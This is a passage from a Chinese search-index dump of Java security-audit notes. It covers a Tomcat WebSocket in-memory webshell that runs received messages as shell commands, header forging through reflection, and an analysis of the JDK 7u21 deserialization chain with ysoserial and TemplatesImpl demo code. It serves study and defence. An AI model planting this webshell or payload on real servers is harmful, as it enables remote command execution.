\u6076\u610f\u7c7b\u53ef\u4ee5\u8fd9\u6837\u88ab\u690d\u5165\u5230\u5185\u5b58\u4e2d ServerContainer container = (ServerContainer) req.getServletContext().getAttribute(ServerContainer.class.getName()); ServerEndpointConfig config = ServerEndpointConfig.Builder.create(evil.class, \"/ws\").build(); container.addEndpoint(config); \u6076\u610f\u7c7b\u957f\u8fd9\u6837\uff0c\u8c03\u7528onmessage\u65b9\u6cd5\u8fdb\u884c\u6076\u610f\u64cd\u4f5c public static class C extends Endpoint implements MessageHandler.Whole<String> { private Session session; @Override public void onMessage(String s) { try { Process process; boolean bool = System.getProperty(\"os.name\").toLowerCase().startsWith(\"windows\"); if (bool) { process = Runtime.getRuntime().exec(new String[] { \"cmd.exe\", \"/c\", s }); } else { process = Runtime.getRuntime().exec(new String[] { \"/bin/bash\", \"-c\", s }); } InputStream inputStream = process.getInputStream(); StringBuilder stringBuilder = new StringBuilder(); int i; while ((i = inputStream.read()) != -1) stringBuilder.append((char)i); inputStream.close(); process.waitFor(); session.getBasicRemote().sendText(stringBuilder.toString()); } catch (Exception exception) { exception.printStackTrace(); } } @Override public void onOpen(final Session session, EndpointConfig config) { this.session = session; session.addMessageHandler(this); } } \u690d\u5165\u540e\u7684\u89e6\u53d1\u903b\u8f91","title":"addEndpoint \u6ce8\u5165\u5185\u5b58"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/tomcat%20websocket%E5%86%85%E5%AD%98%E9%A9%AC/tomcat%20websocket%E5%86%85%E5%AD%98%E9%A9%AC/#_2","text":"\u4e5f\u53ef\u4ee5\u901a\u8fc7\u6ce8\u91ca\u6765\u6dfb\u52a0webscoket\u7aef\u70b9\uff0c\u4f46\u662f\u5b9e\u9645\u6e17\u900f\u4e2d\u6211\u4eec\u5f80\u5f80\u662f\u4f20jsp\uff0cjsp\u4e0d\u652f\u6301\u6ce8\u91ca\u3002 \u6240\u4ee5\u8fd9\u4e2a\u65b9\u6cd5\u4e86\u89e3\u4e00\u4e0b\u5373\u53ef\u3002 @ServerEndpoint(value = \"/websocket\")","title":"\u6ce8\u91ca"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/tomcat%20websocket%E5%86%85%E5%AD%98%E9%A9%AC/tomcat%20websocket%E5%86%85%E5%AD%98%E9%A9%AC/#_3","text":"","title":""},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/tomcat%20websocket%E5%86%85%E5%AD%98%E9%A9%AC/tomcat%20websocket%E5%86%85%E5%AD%98%E9%A9%AC/#-","text":"private void SetHeader(HttpServletRequest request, String key, String value){ Class<? extends HttpServletRequest> requestClass = request.getClass(); try { Field requestField = requestClass.getDeclaredField(\"request\"); requestField.setAccessible(true); Object requestObj = requestField.get(request); Field coyoteRequestField = requestObj.getClass().getDeclaredField(\"coyoteRequest\"); coyoteRequestField.setAccessible(true); Object coyoteRequestObj = coyoteRequestField.get(requestObj); Field headersField = coyoteRequestObj.getClass().getDeclaredField(\"headers\"); headersField.setAccessible(true); MimeHeaders headersObj = (MimeHeaders)headersField.get(coyoteRequestObj); headersObj.removeHeader(key); headersObj.addValue(key).setString(value); } catch (Exception e) { e.printStackTrace(); } } SetHeader(request,\"Connection\",\"upgrade\"); SetHeader(request,\"Sec-WebSocket-Version\",\"13\"); SetHeader(request,\"Upgrade\",\"websocket\");","title":"\u624b\u52a8\u5347\u7ea7-\u65e0\u9700\u6ce8\u5165"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","text":"\u53cd\u5e8f\u5217\u5316 java\u5b89\u5168\u4e2d\u91cd\u8981\u7684\u51e0\u4e2a\u673a\u5236 JAVA\u53cd\u5e8f\u5217\u5316\u653b\u51fb\u7684\u56de\u663e Gadget Hessian Gadget\u5229\u7528\u7c7b\u603b\u7ed3","title":"\u53cd\u5e8f\u5217\u5316"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_1","text":"java\u5b89\u5168\u4e2d\u91cd\u8981\u7684\u51e0\u4e2a\u673a\u5236 JAVA\u53cd\u5e8f\u5217\u5316\u653b\u51fb\u7684\u56de\u663e Gadget Hessian Gadget\u5229\u7528\u7c7b\u603b\u7ed3","title":"\u53cd\u5e8f\u5217\u5316"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/Gadget/","text":"Gadget CC\u94fe\u5206\u6790 8u20\u94fe\u6d45\u6790 7u21\u94fe\u6d45\u6790 JNDI\u6ce8\u5165\u539f\u7406\u6d45\u6790 CommonsBeanUtils \u53cd\u5e8f\u5217\u5316 RMI ATTACK C3P0\u94fe","title":"Gadget"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/Gadget/#gadget","text":"CC\u94fe\u5206\u6790 8u20\u94fe\u6d45\u6790 7u21\u94fe\u6d45\u6790 JNDI\u6ce8\u5165\u539f\u7406\u6d45\u6790 CommonsBeanUtils \u53cd\u5e8f\u5217\u5316 RMI ATTACK C3P0\u94fe","title":"Gadget"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/7u21%E9%93%BE%E6%B5%85%E6%9E%90/7u21%E9%93%BE%E6%B5%85%E6%9E%90/","text":"7u21\u94fe\u6d45\u6790 \u76ee\u5f55 \u7b80\u4ecb \u5206\u6790 from ysonerial TemplatesImpl AnnotationInvocationHandler LinkedHashSet \u5b8c\u6574payload \u603b\u7ed3 \u5b98\u65b9\u4fee\u590d \u7b80\u4ecb jdk7u21 \u94fe\uff0c\u662f\u4e00\u4e2a\u4e0d\u9700\u8981\u501f\u52a9\u7b2c\u4e09\u65b9\u5e93\u5c31\u80fd\u5b9e\u73b0\u7684\u94fe\u3002\u5f71\u54cd\u7248\u672c<=7u21 \u5206\u6790 from ysonerial \u6211\u4eec\u5148\u6765\u770b\u770bysonerial\u91cc\u7684payload\u662f\u600e\u4e48\u5199\u7684\uff0c\u7136\u540e\u6cbf\u7740\u5176\u601d\u8def\u8fdb\u884c\u5206\u6790 public Object getObject(String command) throws Exception { Object templates = Gadgets.createTemplatesImpl(command); String zeroHashCodeStr = \"f5a5a608\"; HashMap map = new HashMap(); map.put(zeroHashCodeStr, \"foo\"); InvocationHandler tempHandler = (InvocationHandler)Reflections.getFirstCtor(\"sun.reflect.annotation.AnnotationInvocationHandler\").newInstance(Override.class, map); Reflections.setFieldValue(tempHandler, \"type\", Templates.class); Templates proxy = (Templates)Gadgets.createProxy(tempHandler, Templates.class, new Class[0]); LinkedHashSet set = new LinkedHashSet(); set.add(templates); set.add(proxy); Reflections.setFieldValue(templates, \"_auxClasses\", (Object)null); Reflections.setFieldValue(templates, \"_class\", (Object)null); map.put(zeroHashCodeStr, templates); return set; } TemplatesImpl \u6211\u4eec\u770b\u5230\uff0cysonerial\u7684payload\u4e0a\u6765\u5c31\u901a\u8fc7Gadgets.createTemplatesImpl(command) \u8bd5\u56fe\u521b\u5efa\u4e00\u4e2aTemplatesImpl\u7c7b\u3002 createTemplatesImpl\u6e90\u7801\u5982\u4e0b\uff0c\u6211\u4eec\u53d1\u73b0\u521b\u5efaTemplatesImpl\u7c7b\u540e\u53c8\u901a\u8fc7\u53cd\u5c04\u548cjavassist\u505a\u4e86\u8bb8\u591a\u64cd\u4f5c\u3002 public static <T> T createTemplatesImpl(String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory) throws Exception { T templates = tplClass.newInstance(); ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(Gadgets.StubTransletPayload.class)); pool.insertClassPath(new ClassClassPath(abstTranslet)); CtClass clazz = pool.get(Gadgets.StubTransletPayload.class.getName()); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"\" + command.replaceAll(\"\\\\\\\\\", \"\\\\\\\\\\\\\\\\\").replaceAll(\"\\\"\", \"\\\\\\\"\") + \"\\\");\"; clazz.makeClassInitializer().insertAfter(cmd); clazz.setName(\"ysoserial.Pwner\" + System.nanoTime()); CtClass superC = pool.get(abstTranslet.getName()); clazz.setSuperclass(superC); byte[] classBytes = clazz.toBytecode(); Reflections.setFieldValue(templates, \"_bytecodes\", new byte[][]{classBytes, ClassFiles.classAsBytes(Gadgets.Foo.class)}); Reflections.setFieldValue(templates, \"_name\", \"Pwnr\"); Reflections.setFieldValue(templates, \"_tfactory\", transFactory.newInstance()); return templates; } \u90a3\u4e48\u4e3a\u4ec0\u4e48\u8981\u521b\u5efa\u8fd9\u4e2a\u7c7b\u5e76\u4e14\u8c03\u7528\u53cd\u5c04\u548cjavassist\u673a\u5236\u5462\uff1f\u5148\u4e0d\u6025\uff0c\u6211\u4eec\u770b\u4e00\u4e0bTemplatesImpl\u6e90\u7801\u3002 \u9996\u5148TemplatesImpl\u7c7b\u4e2d\u6709\u4e2a\u65b9\u6cd5defineTransletClasses\uff0c\u5b83\u7684\u4e3b\u8981\u4ee3\u7801\u5982\u4e0b private byte[][] _bytecodes = (byte[][])null; private void defineTransletClasses() throws TransformerConfigurationException { if (this._bytecodes == null) { ..... } else { TemplatesImpl.TransletClassLoader loader = (TemplatesImpl.TransletClassLoader)AccessController.doPrivileged(new PrivilegedAction() { public Object run() { return new TemplatesImpl.TransletClassLoader(ObjectFactory.findClassLoader()); } }); try { int classCount = this._bytecodes.length; this._class = new Class[classCount]; for(int i = 0; i < classCount; ++i) { this._class[i] = loader.defineClass(this._bytecodes[i]); \\\\\u5c06_bytecodes\u4e2d\u7684\u6240\u6709\u5b57\u8282\u901a\u8fc7defineClass\u8f6c\u5316\u4e3a\u4e00\u4e2a\u7c7b Class superClass = this._class[i].getSuperclass(); if (superClass.getName().equals(ABSTRACT_TRANSLET)) { this._transletIndex = i; } else { this._auxClasses.put(this._class[i].getName(), this._class[i]); } } } \u4e5f\u5c31\u662f\u8bf4\u901a\u8fc7\u8fd9\u4e2a\u65b9\u6cd5\u53ef\u4ee5\u5c06_bytecodes\u6570\u7ec4\u4e2d\u7684\u5b57\u8282\u8fd8\u539f\u6210\u4e00\u4e2a\u7c7b\uff0c\u5b58\u50a8\u5230_class\u53d8\u91cf\u4e2d\u3002\u63a5\u4e0b\u6765\u5982\u679c\u6211\u4eec\u80fd\u627e\u5230\u8c03\u7528defineTransletClasses\u65b9\u6cd5\u5e76\u6267\u884c\u4e86_class[].newinstance() \u8fd9\u6837\u7684\u7684\u4ee3\u7801\u7684\u65b9\u6cd5\uff0c\u5c31\u80fd\u5b9e\u4f8b\u5316\u4ece\u5b57\u8282\u5f97\u5230\u7684\u7c7b\u4e86\uff0c\u4ece\u800c\u5c31\u80fd\u6267\u884c\u7c7b\u4e2d\u7684\u9759\u6001\u4ee3\u7801\u5757\u548c\u6784\u9020\u51fd\u6570\u4e86\uff01 \u6240\u4ee5\u63a5\u4e0b\u6765\u6211\u4eec\u9700\u8981\u53bb\u5bfb\u627e\u8fd9\u79cd\u65b9\u6cd5\u3002 \u901a\u8fc7\u641c\u7d22defineTransletClasses\uff0c\u6211\u4eec\u627e\u5230\u4e86\u6709\u5982\u4e0b\u4e09\u4e2a\u65b9\u6cd5\u8c03\u7528\u4e86defineTransletClasses\u65b9\u6cd5\uff1a getTransletInstance getTransletIndex getTransletClasses \u5176\u4e2d\uff0cgetTransletInstance\u65b9\u6cd5\u662f\u552f\u4e00\u7b26\u5408\u201c\u8c03\u7528\u4e86defineTransletClasses\u4e14\u6709_class[].newinstance()\u201d\u7684\u65b9\u6cd5\uff0c\u5176\u4ee3\u7801\u5982\u4e0b private Translet getTransletInstance() throws TransformerConfigurationException { ErrorMsg err; try { if (this._name == null) { return null; } else { if (this._class == null) { this.defineTransletClasses(); } AbstractTranslet translet = (AbstractTranslet)this._class[this._transletIndex].newInstance(); \\\\here translet.postInitialization(); translet.setTemplates(this); translet.setServicesMechnism(this._useServicesMechanism); if (this._auxClasses != null) { translet.setAuxiliaryClasses(this._auxClasses); } return translet; } \u90a3\u4e48\uff0cgetTransletInstance\u662f\u4e00\u4e2aprivate\u65b9\u6cd5\uff0c\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u8c03\u7528\u5b83\uff0c\u5728\u90a3\u91cc\u80fd\u53bb\u8c03\u7528\u5b83\u5462\uff1f\u7b54\u6848\u662fnewTransformer\u65b9\u6cd5 public synchronized Transformer newTransformer() throws TransformerConfigurationException { TransformerImpl transformer = new TransformerImpl(this.getTransletInstance(), this._outputProperties, this._indentNumber, this._tfactory); \\\\here \u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7 } OK.\u6211\u4eec\u627e\u5230\u4e86\u89e6\u53d17u21\u94fe\u7684\u4e00\u4e2a\u6838\u5fc3\u70b9\u4e86\u3002\u6211\u4eec\u5199\u4e2a\u5c0fdemo\u6765\u901a\u8fc7TemplatesImpl\u5b9e\u73b0\u4ee3\u7801\u6267\u884c \u5c0fdemo\u7684\u5b9e\u73b0\u601d\u8def\u4e3a\uff1a\u901a\u8fc7javassist\u52a8\u6001\u751f\u6210\u4e00\u4e2a\u6076\u610f\u7c7b\uff08\u6784\u9020\u65b9\u6cd5\u6216\u8005\u9759\u6001\u4ee3\u7801\u5757\u6709\u6076\u610f\u4ee3\u7801\uff09\uff0c\u7136\u540e\u901a\u8fc7\u53cd\u5c04\u751f\u6210\u4e00\u4e2aTemplatesImpl\u5bf9\u8c61\u5e76\u8bbe\u7f6e\u5404\u4e2a\u53d8\u91cf\u7684\u503c\uff0c\u7136\u540e\u8c03\u7528\u4e00\u4e0bTemplatesImpl\u5bf9\u8c61\u7684newTransformer\u65b9\u6cd5\u5373\u53ef\u9020\u6210\u4ee3\u7801\u6267\u884c\uff0c\u4ee3\u7801\u5982\u4e0b \u9996\u5148TemplatesImpl\u7c7b\u4e2d\u6709\u4e2a\u65b9\u6cd5defineTransletClasses\uff0c\u5b83\u7684\u4e3b\u8981\u4ee3\u7801\u5982\u4e0b private byte[][] _bytecodes = (byte[][])null; private void defineTransletClasses() throws TransformerConfigurationException { if (this._bytecodes == null) { ..... } else { TemplatesImpl.TransletClassLoader loader = (TemplatesImpl.TransletClassLoader)AccessController.doPrivileged(new PrivilegedAction() { public Object run() { return new TemplatesImpl.TransletClassLoader(ObjectFactory.findClassLoader()); } }); try { int classCount = this._bytecodes.length; this._class = new Class[classCount]; for(int i = 0; i < classCount; ++i) { this._class[i] = loader.defineClass(this._bytecodes[i]); \\\\\u5c06_bytecodes\u4e2d\u7684\u6240\u6709\u5b57\u8282\u901a\u8fc7defineClass\u8f6c\u5316\u4e3a\u4e00\u4e2a\u7c7b Class superClass = this._class[i].getSuperclass(); if (superClass.getName().equals(ABSTRACT_TRANSLET)) { this._transletIndex = i; } else { this._auxClasses.put(this._class[i].getName(), this._class[i]); } } } \u4e5f\u5c31\u662f\u8bf4\u901a\u8fc7\u8fd9\u4e2a\u65b9\u6cd5\u53ef\u4ee5\u5c06_bytecodes\u6570\u7ec4\u4e2d\u7684\u5b57\u8282\u8fd8\u539f\u6210\u4e00\u4e2a\u7c7b\uff0c\u5b58\u50a8\u5230_class\u53d8\u91cf\u4e2d\u3002\u63a5\u4e0b\u6765\u5982\u679c\u6211\u4eec\u80fd\u627e\u5230\u8c03\u7528defineTransletClasses\u65b9\u6cd5\u5e76\u6267\u884c\u4e86_class[].newinstance() \u8fd9\u6837\u7684\u7684\u4ee3\u7801\u7684\u65b9\u6cd5\uff0c\u5c31\u80fd\u5b9e\u4f8b\u5316\u4ece\u5b57\u8282\u5f97\u5230\u7684\u7c7b\u4e86\uff0c\u4ece\u800c\u5c31\u80fd\u6267\u884c\u7c7b\u4e2d\u7684\u9759\u6001\u4ee3\u7801\u5757\u548c\u6784\u9020\u51fd\u6570\u4e86\uff01 \u6240\u4ee5\u63a5\u4e0b\u6765\u6211\u4eec\u9700\u8981\u53bb\u5bfb\u627e\u8fd9\u79cd\u65b9\u6cd5\u3002 \u901a\u8fc7\u641c\u7d22defineTransletClasses\uff0c\u6211\u4eec\u627e\u5230\u4e86\u6709\u5982\u4e0b\u4e09\u4e2a\u65b9\u6cd5\u8c03\u7528\u4e86defineTransletClasses\u65b9\u6cd5\uff1a getTransletInstance getTransletIndex getTransletClasses \u5176\u4e2d\uff0cgetTransletInstance\u65b9\u6cd5\u662f\u552f\u4e00\u7b26\u5408\u201c\u8c03\u7528\u4e86defineTransletClasses\u4e14\u6709_class[].newinstance()\u201d\u7684\u65b9\u6cd5\uff0c\u5176\u4ee3\u7801\u5982\u4e0b private Translet getTransletInstance() throws TransformerConfigurationException { ErrorMsg err; try { if (this._name == null) { return null; } else { if (this._class == null) { this.defineTransletClasses(); } AbstractTranslet translet = (AbstractTranslet)this._class[this._transletIndex].newInstance(); \\\\here translet.postInitialization(); translet.setTemplates(this); translet.setServicesMechnism(this._useServicesMechanism); if (this._auxClasses != null) { translet.setAuxiliaryClasses(this._auxClasses); } return translet; } \u90a3\u4e48\uff0cgetTransletInstance\u662f\u4e00\u4e2aprivate\u65b9\u6cd5\uff0c\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u8c03\u7528\u5b83\uff0c\u5728\u90a3\u91cc\u80fd\u53bb\u8c03\u7528\u5b83\u5462\uff1f\u7b54\u6848\u662fnewTransformer\u65b9\u6cd5 public synchronized Transformer newTransformer() throws TransformerConfigurationException { TransformerImpl transformer = new TransformerImpl(this.getTransletInstance(), this._outputProperties, this._indentNumber, this._tfactory); \\\\here \u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7 } OK.\u6211\u4eec\u627e\u5230\u4e86\u89e6\u53d17u21\u94fe\u7684\u4e00\u4e2a\u6838\u5fc3\u70b9\u4e86\u3002\u6211\u4eec\u5199\u4e2a\u5c0fdemo\u6765\u901a\u8fc7TemplatesImpl\u5b9e\u73b0\u4ee3\u7801\u6267\u884c \u5c0fdemo\u7684\u5b9e\u73b0\u601d\u8def\u4e3a\uff1a\u901a\u8fc7javassist\u52a8\u6001\u751f\u6210\u4e00\u4e2a\u6076\u610f\u7c7b\uff08\u6784\u9020\u65b9\u6cd5\u6216\u8005\u9759\u6001\u4ee3\u7801\u5757\u6709\u6076\u610f\u4ee3\u7801\uff09\uff0c\u7136\u540e\u901a\u8fc7\u53cd\u5c04\u751f\u6210\u4e00\u4e2aTemplatesImpl\u5bf9\u8c61\u5e76\u8bbe\u7f6e\u5404\u4e2a\u53d8\u91cf\u7684\u503c\uff0c\u7136\u540e\u8c03\u7528\u4e00\u4e0bTemplatesImpl\u5bf9\u8c61\u7684newTransformer\u65b9\u6cd5\u5373\u53ef\u9020\u6210\u4ee3\u7801\u6267\u884c\uff0c\u4ee3\u7801\u5982\u4e0b public class test{ public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass cc = pool.makeClass(\"evilclass\"); String cmd = \"Runtime.getRuntime().exec(\\\"calc\\\");\"; cc.makeClassInitializer().insertBefore(cmd); \\\\\u5411\u9759\u6001\u4ee3\u7801\u5757\u63d2\u5165\u6076\u610f\u4ee3\u7801\uff0c\u63d2\u5165\u5230\u6784\u9020\u51fd\u6570\u4e5f\u53ef\u4ee5 cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); \\\\\u9700\u8bbe\u7f6e\u6b64\u9879\u624d\u80fd\u5b9e\u73b0newinstance\uff0c\u5177\u4f53\u539f\u56e0\u8bf7\u770bdefineTransletClasses\u548cgetTransletInstance\u6e90\u7801 cc.setName(\"evilClass\"); byte[] evilbytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{evilbytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); Class clazz = TemplatesImpl.class.newInstance().getClass(); Field[] Fields = clazz.getDeclaredFields(); for (Field Field : Fields) { //\u904d\u5386Fields\u6570\u7ec4 try { Field.setAccessible(true); //\u5bf9\u6570\u7ec4\u4e2d\u7684\u6bcf\u4e00\u9879\u5b9e\u73b0\u79c1\u6709\u8bbf\u95ee if(Field.getName()==\"_bytecodes\"){ Field.set(templates,targetByteCodes); } if(Field.getName()==\"_class\"){ Field.set(templates,null); } if(Field.getName()==\"_name\"){ Field.set(templates,\"abc\"); } if(Field.getName()==\"_tfactory\"){ Field.set(templates,new TemplatesImpl()); } } catch (Exception e) {} } templates.newTransformer(); } } \u4f46\u4ec5\u4ec5\u662f\u8fd9\u6837\uff0c\u80af\u5b9a\u662f\u4e0d\u591f\u7684\u3002 AnnotationInvocationHandler \u6211\u4eec\u7ee7\u7eed\u770bysoserial\u6e90\u7801\u53ef\u4ee5\u770b\u5230\u52a8\u7528\u4e86AnnotationInvocationHandler\u8fd9\u4e2a\u4e1c\u897f.\u8fd9\u4e2a\u7c7b\u539f\u672c\u7684\u4f5c\u7528\u662f\u4f5c\u4e3aAnnotation \u7c7b\u7684\u52a8\u6001\u4ee3\u7406 \u6211\u4eec\u628a\u76ee\u5149\u805a\u7126\u4e8eAnnotationInvocationHandler#invoke\u65b9\u6cd5 public Object invoke(Object var1, Method var2, Object[] var3) { String var4 = var2.getName(); Class[] var5 = var2.getParameterTypes(); if (var4.equals(\"equals\") && var5.length == 1 && var5[0] == Object.class) { return this.equalsImpl(var3[0]); } .......... } \u5b83\u4f1a\u68c0\u6d4b\u4f20\u5165\u7684\u65b9\u6cd5\u4e2d\u662f\u5426\u6709\u7b26\u5408 \u540d\u4e3aequals\uff0c\u53ea\u6709\u4e00\u4e2aObject\u7c7b\u578b\u53c2\u6570\u3002\u82e5\u662f\uff0c\u5219\u8c03\u7528equalsImpl\u65b9\u6cd5\u5e76\u4f20\u5165\u65b9\u6cd5\u4e2d\u7684\u53c2\u6570\u3002 \u8ddf\u8fdbequalsimpl\u65b9\u6cd5 private Boolean equalsImpl(Object var1) { if (var1 == this) { return true; } else if (!this.type.isInstance(var1)) { return false; } else { Method[] var2 = this.getMemberMethods(); int var3 = var2.length; for(int var4 = 0; var4 < var3; ++var4) { Method var5 = var2[var4]; String var6 = var5.getName(); Object var7 = this.memberValues.get(var6); Object var8 = null; AnnotationInvocationHandler var9 = this.asOneOfUs(var1); if (var9 != null) { var8 = var9.memberValues.get(var6); } else { try { var8 = var5.invoke(var1); \\\\here } catch (InvocationTargetException var11) { return false; } catch (IllegalAccessException var12) { throw new AssertionError(var12); } } if (!memberValueEquals(var7, var8)) { return false; } } return true; } } private Method[] getMemberMethods() { if (this.memberMethods == null) { this.memberMethods = (Method[])AccessController.doPrivileged(new PrivilegedAction<Method[]>() { public Method[] run() { Method[] var1 = AnnotationInvocationHandler.this.type.getDeclaredMethods(); AccessibleObject.setAccessible(var1, true); return var1; } }); } return this.memberMethods; } \u53d1\u73b0\u4f1a\u83b7\u53d6this.type\u5bf9\u8c61\u4e2d\u6240\u6709\u65b9\u6cd5\u5e76\u6267\u884c\u3002 \u521b\u5efa\u4e00\u4e2a\u5305\u542b\u6076\u610f\u4ee3\u7801\u7684TemplatesImpl\u5b9e\u4f8b\uff0c\u901a\u8fc7AnnotationInvocationHandler\u521b\u5efa\u4efb\u610f\u4e00\u4e2a\u4ee3\u7406\u5bf9\u8c61\uff0c\u7136\u540e\u4ee3\u7406\u5bf9\u8c61\u8c03\u7528equals\u65b9\u6cd5\u4f20\u5165\u53c2\u6570\u4e3a\u6076\u610fTemplatesImpl\u5bf9\u8c61\uff0c\u5373\u53ef\u9020\u6210\u6076\u610f\u4ee3\u7801\u6267\u884c \u770b\u5230\u8fd9\u91cc\u4e00\u5b9a\u4e00\u5934\u96fe\u6c34\uff0c\u770b\u770bdemo\u4e5f\u8bb8\u4f1a\u597d\u4e00\u70b9 public class test{ public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass cc = pool.makeClass(\"evilclass\"); String cmd = \"Runtime.getRuntime().exec(\\\"calc\\\");\"; CtConstructor cons = new CtConstructor(new CtClass[]{},cc); cons.setBody(\"Runtime.getRuntime().exec(\\\"calc\\\");\"); cc.addConstructor(cons); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); cc.setName(\"evilClass\"); byte[] evilbytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{evilbytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); Class clazz = TemplatesImpl.class.newInstance().getClass(); Field[] Fields = clazz.getDeclaredFields(); for (Field Field : Fields) { //\u904d\u5386Fields\u6570\u7ec4 try { //\u6267\u884cget()\u65b9\u6cd5\u65f6\u9700\u629b\u51faIllegalAccessException\u9519\u8bef Field.setAccessible(true); //\u5bf9\u6570\u7ec4\u4e2d\u7684\u6bcf\u4e00\u9879\u5b9e\u73b0\u79c1\u6709\u8bbf\u95ee if(Field.getName()==\"_bytecodes\"){ Field.set(templates,targetByteCodes); } if(Field.getName()==\"_class\"){ Field.set(templates,null); } if(Field.getName()==\"_name\"){ Field.set(templates,\"abc\"); } if(Field.getName()==\"_tfactory\"){ Field.set(templates,new TemplatesImpl()); } } catch (Exception e) {} } //\u4ee5\u4e0a\u4ee3\u7801\u751f\u6210\u4e86\u6076\u610fTemplatesImpl\u5bf9\u8c61templates Map map = new HashMap(); final Constructor<?> ctor = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\").getDeclaredConstructors()[0]; //\u83b7\u5f97AnnotationInvocationHandler\u6784\u9020\u65b9\u6cd5\uff0c\u65b9\u4fbf\u83b7\u5f97\u5b83\u4e00\u4e2a\u5b9e\u4f8b ctor.setAccessible(true); InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Templates.class, map); //\u8fd9\u91cc\u6709\u4e2a\u95ee\u9898\uff0c\u4e3a\u4ec0\u4e48\u8981\u4f20\u5165Templates\u7c7b\u5bf9\u8c61\u800c\u4e0d\u662fTemplatesImpl Object proxy = Proxy.newProxyInstance(null, Object.class.getInterfaces(), invocationHandler); \\\\\u53cd\u6b63\u521b\u5efa\u4e00\u4e2aAnnotationInvocationHandler\u7684\u4ee3\u7406\u5bf9\u8c61\u5c31\u884c\u4e86\uff0c\u524d\u4e24\u4e2a\u53c2\u6570\u90fd\u4e0d\u7528\u600e\u4e48\u7ba1 proxy.equals(templates); //\u6076\u610f\u4ee3\u7801\u6267\u884c } } \u6211\u4eec\u6162\u6162\u770b\u770b\u903b\u8f91\uff0c\u5728proxy.equals\u5904\u4e0b\u65ad\u70b9\uff0c\u8c03\u8bd5 \u6beb\u65e0\u7591\u95ee\u4f1a\u8fdb\u5165\u5230\u6b64\u5904\uff1aAnnotationInvocationHandler\u7684invoke\u65b9\u6cd5\u3002 \u7136\u540e\u53c2\u6570\u7b26\u5408if\u5224\u65ad\uff0c\u8c03\u7528equalsImpl\u65b9\u6cd5\uff0c\u5e76\u4f20\u5165\u53c2\u6570\u4e3a\u6076\u610fTemplatesImpl\u5bf9\u8c61\uff0c\u63a5\u4e0b\u6765\u5c31\u662f\u8fdb\u5165\u53cd\u5c04\u8c03\u7528\u5904 \u904d\u5386var2\u53d8\u91cf\u4e2d\u7684\u65b9\u6cd5\uff0c\u5e76\u7531\u6211\u4eec\u7684\u6076\u610f\u5bf9\u8c61\u6765\u6267\u884c\u3002 \u2014\u2014\u2014\u2014\u6b64\u5904\u63d2\u4e00\u4e0bvar2\u53d8\u91cf\u7684\u6765\u5386 \u6ce8\u610f\u6b64\u5904\u7684getMemberMethods\u65b9\u6cd5\uff0c\u5b83\u5b9e\u8d28\u4e0a\u662f\u901a\u8fc7\u53cd\u5c04\u83b7\u5f97this.type\u4e2d\u7684\u6240\u6709\u65b9\u6cd5\u3002\u800cthis.type\u662f\u5728\u8be5\u5bf9\u8c61\u6784\u9020\u65b9\u6cd5\u4e2d\u4f20\u5165\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u3002 getMemberMethods\uff1a \u6784\u9020\u65b9\u6cd5\uff1a \u2014\u2014\u2014\u2014\u56de\u5230\u6b63\u9898 \u7531\u4e8e\u6211\u4eec\u901a\u8fc7\u53cd\u5c04\u4f20\u5165\u6784\u9020\u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662fTemplates.class\uff0c\u6240\u4ee5\u5b83\u4f1a\u904d\u5386Templates\u7c7b\u4e2d\u7684\u6240\u6709\u65b9\u6cd5\u3002\u8fd9\u4e2a\u7c7b\u5176\u5b9e\u662fTemplatesImpl\u7684\u63a5\u53e3\u7c7b\uff0c\u5b83\u7684\u4ee3\u7801\u5982\u4e0b \u6240\u4ee5var2\u4e2d\u5b58\u50a8\u7684\u65b9\u6cd5\u53ea\u6709\u4e24\u4e2a\uff0cnewTransformer\u548cgetOutputProperties\u3002 \u7136\u540e\u5f53\u904d\u5386\u5230newTransformer\u65b9\u6cd5\u65f6\uff0c\u5c31\u4f1a\u901a\u8fc7\u53cd\u5c04\u8c03\u7528\u8fbe\u5230 eviltemplatesImpl.newTransformer() \u7684\u6548\u679c\uff0c\u4ece\u800c\u5bfc\u81f4\u6076\u610fTemplatesImpl\u5bf9\u8c61\u4e2d\u7684\u6076\u610f\u4ee3\u7801\u88ab\u6267\u884c\u3002 